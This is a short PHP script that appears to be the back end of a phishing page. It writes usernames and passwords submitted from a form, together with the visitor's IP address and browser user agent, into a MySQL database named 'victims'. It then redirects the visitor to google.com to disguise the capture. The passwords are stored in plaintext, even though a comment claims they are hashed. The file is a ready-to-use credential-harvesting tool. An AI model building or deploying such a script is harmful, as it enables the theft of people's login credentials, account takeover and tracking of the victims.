<?php
/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'root');
define('DB_PASSWORD', '');
define('DB_NAME', 'victims');
 
/* Attempt to connect to MySQL database */
$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
 
// Check connection
if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}


  $ip = $_SERVER['REMOTE_ADDR'];  
  $agent = $_SERVER["HTTP_USER_AGENT"];
$password = trim($_POST['password']);
$username = trim($_POST['uname']);

$sql = "INSERT INTO accounts (username, password, ip, agent) VALUES (?, ?, ?, ?)";
         
        if($stmt = mysqli_prepare($link, $sql)){
            // Bind variables to the prepared statement as parameters
            mysqli_stmt_bind_param($stmt, "ssss", $param_username, $param_password, $param_ip, $param_agent);
            
            // Set parameters
            $param_username = $username;
            $param_password = $password; // Creates a password hash
            $param_ip = $ip;
            $param_agent = $agent;

            
            // Attempt to execute the prepared statement
            if(mysqli_stmt_execute($stmt)){
                header("location:https://google.com");
            } else{
                echo "Oops! Something went wrong. Please try again later.";
            }

            // Close statement
            mysqli_stmt_close($stmt);
        }
    
    
    // Close connection
    mysqli_close($link);
	
	


?>